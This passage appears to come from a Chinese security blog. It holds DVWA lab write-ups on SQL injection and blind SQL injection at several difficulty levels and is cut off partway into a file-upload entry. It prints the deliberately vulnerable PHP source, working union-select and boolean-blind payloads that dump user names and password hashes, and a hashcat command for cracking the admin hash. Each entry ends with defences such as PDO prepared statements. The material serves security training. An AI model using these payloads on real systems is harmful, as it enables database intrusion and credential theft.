class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">rand</span>( <span class="hljs-number">0</span>, <span class="hljs-number">5</span> ) = <span class="hljs-number">3</span> ) &#123;<br>            <span class="hljs-title function_ invoke__">sleep</span>( <span class="hljs-title function_ invoke__">rand</span>( <span class="hljs-number">2</span>, <span class="hljs-number">4</span> ) );<br>        &#125;<br><br>        <span class="hljs-comment">// User wasn&#x27;t found, so the page wasn&#x27;t!</span><br>        <span class="hljs-title function_ invoke__">header</span>( <span class="hljs-variable">$_SERVER</span>[ <span class="hljs-string">&#x27;SERVER_PROTOCOL&#x27;</span> ] . <span class="hljs-string">&#x27; 404 Not Found&#x27;</span> );<br><br>        <span class="hljs-comment">// Feedback for end user</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;<br>    &#125;<br><br>    ((<span class="hljs-title function_ invoke__">is_null</span>(<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="攻击思路-2"><a href="#攻击思路-2" class="headerlink" title="攻击思路"></a>攻击思路</h2><p>由于当查询不到结果时，服务器会等待一段时间，这会对时间盲注造成混淆，因此我们使用 bool 盲注。虽然查询语句添加了 LIMIT 1，但是我们可以利用 “#” 把它注释掉，这种防御形同虚设，此时 bool 盲注的过程与 Low 级别基本一样。</p><ol><li>布尔盲注<ul><li>判断数据库版本第1位是1,<code>1&#39; and substr(version(),1,1) = &#39;1&#39; #</code></li></ul></li></ol><h1 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h1><h2 id="源码-3"><a href="#源码-3" class="headerlink" title="源码"></a>源码</h2><p>impossible 级别的代码采用了 PDO 技术，防止代码和查询数据的混杂，Anti-CSRFtoken 机制的加入了进一步提高了安全性。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;Submit&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Check Anti-CSRF token</span><br>    <span class="hljs-title function_ invoke__">checkToken</span>( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br><br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;id&#x27;</span> ];<br><br>    <span class="hljs-comment">// Was a number entered?</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_numeric</span>( <span class="hljs-variable">$id</span> )) &#123;<br>        <span class="hljs-comment">// Check the database</span><br>        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>( <span class="hljs-string">&#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27;</span> );<br>        <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:id&#x27;</span>, <span class="hljs-variable">$id</span>, PDO::<span class="hljs-variable constant_">PARAM_INT</span> );<br>        <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br><br>        <span class="hljs-comment">// Get results</span><br>        <span class="hljs-keyword">if</span>( <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">rowCount</span>() == <span class="hljs-number">1</span> ) &#123;<br>            <span class="hljs-comment">// Feedback for end user</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// User wasn&#x27;t found, so the page wasn&#x27;t!</span><br>            <span class="hljs-title function_ invoke__">header</span>( <span class="hljs-variable">$_SERVER</span>[ <span class="hljs-string">&#x27;SERVER_PROTOCOL&#x27;</span> ] . <span class="hljs-string">&#x27; 404 Not Found&#x27;</span> );<br><br>            <span class="hljs-comment">// Feedback for end user</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// Generate Anti-CSRF token</span><br><span class="hljs-title function_ invoke__">generateSessionToken</span>();<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>SQL 注入攻击就是 Web 程序对用户的输入没有进行合法性判断，从而攻击者可以从前端向后端传入攻击参数，并且该参数被带入了后端执行。在很多情况下开发者会使用动态的 SQL 语句，这种语句是在程序执行过程中构造的，不过动态的 SQL 语句很容易被攻击者传入的参数改变其原本的功能。<br>当我们进行手工 SQL 注入时，往往是采取以下几个步骤：</p><ol><li>判断是否存在注入，注入是字符型还是数字型</li><li>猜解SQL查询语句中的字段数；</li><li>获取当前数据库；</li><li>获取数据库中的表；</li><li>获取表中的字段名；</li></ol><p>当开发者需要防御 SQL 注入攻击时，可以采用以下方法。</p><ol><li>过滤危险字符：可以使用正则表达式匹配各种 SQL 子句，例如 select,union,where 等，如果匹配到则退出程序。</li><li>使用预编译语句：PDO 提供了一个数据访问抽象层，这意味着不管使用哪种数据库，都可以用相同的函数（方法）来查询和获取数据。使用 PDO 预编译语句应该使用占位符进行数据库的操作，而不是直接将变量拼接进去。</li></ol>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQL盲注</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dvwa-SQL-injection</title>
    <link href="/2022/06/05/dvwa-SQL-injection/"/>
    <url>/2022/06/05/dvwa-SQL-injection/</url>
    
    <content type="html"><![CDATA[<blockquote><p>SQL Inject中文叫做SQL注入，是发生在web端的安全漏洞，主要是实现非法操作，例如欺骗服务器执行非法查询，属于注入攻击的一种</p></blockquote><blockquote><p>简单来说就是通过web表单把SQL命令提交到数据库，由于管理员没有细致的过滤用户输入的数据，造成字符串拼接，进而恶意的SQL语句被执行，造成数据库信息泄露、网页篡改、数据库被恶意操作等后果。</p></blockquote><h1 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h1><p>SQL Injection分类：</p><ul><li>从注入参数类型分类：数字型注入、字符型注入、搜索型注入</li><li>从注入方法分：报错注入、布尔盲注、时间盲注、联合查询注入、堆叠注入、内联查询注入、宽字节注入</li><li>从提交方式分：GET注入、POST注入、COOKIE注入、HTTP头注入</li></ul><h1 id="low"><a href="#low" class="headerlink" title="low"></a>low</h1><h2 id="请求页面"><a href="#请求页面" class="headerlink" title="请求页面"></a>请求页面</h2><p><img src="/2022/06/05/dvwa-SQL-injection/1692026676570.png" alt="1692026676570"></p><h2 id="http请求"><a href="#http请求" class="headerlink" title="http请求"></a>http请求</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/vulnerabilities/sqli/?id=1&amp;Submit=Submit</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:4280<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost:4280/vulnerabilities/sqli/<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>security=low; PHPSESSID=6058ace1f2f087663ecfbc8858534749<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br><br></code></pre></td></tr></table></figure><h2 id="响应页面"><a href="#响应页面" class="headerlink" title="响应页面"></a>响应页面</h2><p>给它输入个 <code>1</code>试试,哎，上钩了！是有回显的。<br><img src="/2022/06/05/dvwa-SQL-injection/1692026772071.png" alt="1692026772071"><br>话不多说，直接看题</p><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><p>源码太长了，直接贴关键的吧,可以说是没有丝毫过滤，页面回显</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;id&#x27;</span> ]<br><br><span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="hljs-subst">$id</span>&#x27;;&quot;</span>;<br><span class="hljs-keyword">while</span>( <span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_assoc</span>( <span class="hljs-variable">$result</span> ) ) &#123;<br>        <span class="hljs-comment">// 页面回显</span><br>        <span class="hljs-variable">$first</span> = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;first_name&quot;</span>];<br>        <span class="hljs-variable">$last</span>  = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;last_name&quot;</span>];<br>        <span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;pre&gt;ID: <span class="hljs-subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="hljs-subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="hljs-subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h2><p>假装我们没有看过源码，纯手工一步步来，增加学习印象</p><ol><li>判断注入类型<br>由于输入的数据 id 是数字，我们并不知道服务器将 id 的值认为是字符还是数字，因此我们需要先来判断是数字型注入还是字符型注入(虽然从源码看得出来)。当输入的参数为字符串时就称该 SQL 注入为字符型，当输入的参数为数字时就称该 SQL 注入为数字型。字符型和数字型最大的一个区别在于数字型不需要单引号来闭合，而字符型需要通过单引号来闭合。</li></ol><ul><li>输入 <code>1‘</code>   ，出现回显 <code>Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;&#39;1&#39;&#39;&#39; at line 1</code><br>说明是<strong>字符型注入</strong></li></ul><ol start="2"><li>判断回显列数（”#”在SQL中表示行内注释）</li></ol><ul><li>联合查询，依次输入 <code>1&#39; union select 1#</code>  <code>1&#39; union select 1，2#</code>  <code>1&#39; union select 1#</code><br>查看回显，发现只有 <code>1&#39; union select 1,2#</code>回显正常,说明回显只有两个字段。说明还可以<strong>联合注入</strong></li></ul><ol start="3"><li>获取其他信息</li></ol><ul><li>查询数据库名。输入 <code>1&#39; union SELECT DATABASE(),VERSION()#</code></li></ul><p><img src="/2022/06/05/dvwa-SQL-injection/1692090066161.png" alt="1692090066161"><br><code>当前数据库</code>为 <code>dvwa</code>，<br><code>数据库版本</code>为 <code>10.11.4-MariaDB</code><br>MariaDB是MySQL的一个分支，完全兼容，并且版本号大于5.0,就能利用 <code>information_schema</code>数据库查询更多信息</p><ul><li>查询表名。输入 <code>1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema = &#39;dvwa&#39;#</code> “group_concat()”函数返回一个字符串结果，该结果由分组中的值连接组合而成。</li></ul><p><img src="/2022/06/05/dvwa-SQL-injection/1692090682710.png" alt="1692090682710"><br><code>dvwa</code>数据库有2张表 <code>guestbook</code>  <code>users</code></p><ul><li>查询字段(列名)。输入 <code>1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name = &#39;users&#39; #</code><br><img src="/2022/06/05/dvwa-SQL-injection/1692092930950.png" alt="1692092930950"><br>字段为 <code>user_id,first_name,last_name,user,password,avatar,last_login,failed_login</code></li><li>查询用户名密码。输入 <code>&#39;union select group_concat(user separator &quot;\n&quot;),group_concat(password separator &quot;\n&quot;) from users #</code><br><img src="/2022/06/05/dvwa-SQL-injection/1692094237026.png" alt="1692094237026"><br>看到密码并非是明文，32位字符16个字节，考虑是md5值</li><li>解密admin的密码 <code>5f4dcc3b5aa765d61d8327deb882cf99</code><ol><li>md5在线网站</li><li>kali命令字典爆破 <code>hashcat -a 0 -m 0  5f4dcc3b5aa765d61d8327deb882cf99  /usr/share/wordlists/metasploit/default_pass_for_services_unhash.txt</code></li></ol></li></ul><h1 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h1><h2 id="请求页面-1"><a href="#请求页面-1" class="headerlink" title="请求页面"></a>请求页面</h2><p><img src="/2022/06/05/dvwa-SQL-injection/1692098320586.png" alt="1692098320586"></p><h2 id="http请求-1"><a href="#http请求-1" class="headerlink" title="http请求"></a>http请求</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/vulnerabilities/sqli/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:4280<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>18<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://localhost:4280<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost:4280/vulnerabilities/sqli/<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>security=medium; PHPSESSID=6058ace1f2f087663ecfbc8858534749<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br><span class="language-ini"><span class="hljs-attr">id</span>=<span class="hljs-number">1</span>&amp;Submit=Submit</span><br></code></pre></td></tr></table></figure><h2 id="响应页面-1"><a href="#响应页面-1" class="headerlink" title="响应页面"></a>响应页面</h2><p><img src="/2022/06/05/dvwa-SQL-injection/1692098433045.png" alt="1692098433045"></p><h2 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h2><p>源码如下，源码使用了 mysql_real_escape_string() 函数转义字符串中的特殊字符。也就是说特殊符号 \x00、\n、\r、\、’、” 和 \x1a 都将进行转义。同时开发者把前端页面的输入框删了，改成了下拉选择表单，希望以此来控制用户的输入。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;id&#x27;</span> ];<br><br><span class="hljs-variable">$id</span> = <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>], <span class="hljs-variable">$id</span>);<br><br><span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class="hljs-subst">$id</span>;&quot;</span>;<br><br><span class="hljs-keyword">while</span>( <span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_assoc</span>( <span class="hljs-variable">$result</span> ) ) &#123;<br>                <span class="hljs-comment">// Get values</span><br>                <span class="hljs-variable">$first</span> = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;first_name&quot;</span>];<br>                <span class="hljs-variable">$last</span>  = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;last_name&quot;</span>];<br><br>                <span class="hljs-comment">// Feedback for end user</span><br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;ID: <span class="hljs-subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="hljs-subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="hljs-subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;<br>            &#125; <br></code></pre></td></tr></table></figure><h2 id="攻击思路-1"><a href="#攻击思路-1" class="headerlink" title="攻击思路"></a>攻击思路</h2><p>POST请求 ，我们用Burp抓包处理</p><ol><li>判断注入类型。可以知道是<strong>数字型注入</strong></li><li>判断回显。同样是回显2列</li><li>获取其他信息。（跟low级别一样，不过注入语句需要去掉单引号）</li></ol><h1 id="high"><a href="#high" class="headerlink" title="high"></a>high</h1><h2 id="请求页面-2"><a href="#请求页面-2" class="headerlink" title="请求页面"></a>请求页面</h2><p>点击 <code>here to chang you ID</code>,会弹框，索性一块整上<br><img src="/2022/06/05/dvwa-SQL-injection/1692105076889.png" alt="1692105076889"></p><h2 id="http请求-2"><a href="#http请求-2" class="headerlink" title="http请求"></a>http请求</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/vulnerabilities/sqli/session-input.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:4280<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>18<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span><br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://localhost:4280<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost:4280/vulnerabilities/sqli/session-input.php<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=18803c9408dc8d6e81a36d2e36a00d63; security=high<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-ini"><span class="hljs-attr">id</span>=<span class="hljs-number">1</span>&amp;Submit=Submit</span><br></code></pre></td></tr></table></figure><h2 id="响应页面-2"><a href="#响应页面-2" class="headerlink" title="响应页面"></a>响应页面</h2><p><img src="/2022/06/05/dvwa-SQL-injection/1692105332882.png" alt="1692105332882"></p><h2 id="源码-2"><a href="#源码-2" class="headerlink" title="源码"></a>源码</h2><p>只是在low的级别后面进行了 <code>LIMIT 1</code>限制回显个数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 1;&quot;</span>; <br></code></pre></td></tr></table></figure><h2 id="攻击思路-2"><a href="#攻击思路-2" class="headerlink" title="攻击思路"></a>攻击思路</h2><p>直接复用low级别的注入语句的话，我看也没什么问题，因为“#”直接注释掉了“LIMIT 1”，试一下真的是一样<br><img src="/2022/06/05/dvwa-SQL-injection/1692105941841.png" alt="1692105941841"></p><hr><p>值得注意的是，这里查询内容提交和结果显示使用不同页面显示的防御功能，需要特别提到的是，这样做是为了防止注入工具例如 sqlmap 注入。因为 sqlmap 在注入过程中无法在查询提交页面上获取查询的结果，因此收不到任何反馈，也就没办法进一步注入。但是，这种情况在Firefox上是的，但是在Chrome内核的浏览器不是。在Edge、Chrome上页面提交和页面显示还是在同一个页面上。</p><hr><h1 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h1><h2 id="源码-3"><a href="#源码-3" class="headerlink" title="源码"></a>源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>( <span class="hljs-string">&#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27;</span> );<br>               <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:id&#x27;</span>, <span class="hljs-variable">$id</span>, PDO::<span class="hljs-variable constant_">PARAM_INT</span> );<br>               <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>               <span class="hljs-variable">$row</span> = <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>();<br>           <br></code></pre></td></tr></table></figure><p>Impossible 级别的代码采用了 PDO 技术，防止代码和查询数据的混杂。实现了查询语句中的数据与命令相分离。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>SQL 注入攻击就是 Web 程序对用户的输入没有进行合法性判断，从而攻击者可以从前端向后端传入攻击参数，并且该参数被带入了后端执行。在很多情况下开发者会使用动态的 SQL 语句，这种语句是在程序执行过程中构造的，不过动态的 SQL 语句很容易被攻击者传入的参数改变其原本的功能。<br>当我们进行手工 SQL 注入时，往往是采取以下几个步骤：</p><ol><li>判断是否存在注入，注入是字符型还是数字型</li><li>猜解SQL查询语句中的字段数；</li><li>获取当前数据库；</li><li>获取数据库中的表；</li><li>获取表中的字段名；</li></ol><p>当开发者需要防御 SQL 注入攻击时，可以采用以下方法。</p><ol><li>过滤危险字符：可以使用正则表达式匹配各种 SQL 子句，例如 select,union,where 等，如果匹配到则退出程序。</li><li>使用预编译语句：PDO 提供了一个数据访问抽象层，这意味着不管使用哪种数据库，都可以用相同的函数（方法）来查询和获取数据。使用 PDO 预编译语句应该使用占位符进行数据库的操作，而不是直接将变量拼接进去。</li></ol>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dvwa-file-upload</title>
    <link href="/2022/06/04/dvwa-file-upload/"/>
    <url>/2022/06/04/dvwa-file-upload/</url>
    
    <content type="html"><![CDATA[<blockquote><p>上传的文件对 web 应用程序来说是一个巨大的风险，许多攻击的第一步是上传攻击代码到被攻击的系统上，然后攻击者只需要找到方法来执行代码即可完成攻击。也就是是说，文件上传是攻击者需要完成的第一步。<br>不受限制的文件上载的后果可能不同，包括完全接管系统、文件系统过载、将攻击转发到后端系统以及简单的破坏。这取决于应用程序对上载的文件做了什么，和文件的存储位置。</p></blockquote><h1 id="请求页面"><a href="#请求页面" class="headerlink" title="请求页面"></a>请求页面</h1><p><img src="/2022/06/04/dvwa-file-upload/1691932776938.png" alt="1691932776938"></p><h1 id="low"><a href="#low" class="headerlink" title="low"></a>low</h1><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><p>源码如下，basename(path,suffix) 函数返回路径中的文件名部分，如果可选参数 suffix 为空则返回的文件名包含后缀名，反之不包含后缀名。move_uploaded_file() 函数将上传的文件移动到新位置。若成功则返回 true，否则返回 false。由此可见源码对上传文件直接移动，而文件的类型、内容没有做任何的检查、过滤。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Upload&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Where are we going to be writing to?</span><br>    <span class="hljs-variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="hljs-string">&quot;hackable/uploads/&quot;</span>;<br>    <span class="hljs-variable">$target_path</span> .= <span class="hljs-title function_ invoke__">basename</span>( <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;name&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Can we move the file to the upload folder?</span><br>    <span class="hljs-keyword">if</span>( !<span class="hljs-title function_ invoke__">move_uploaded_file</span>( <span 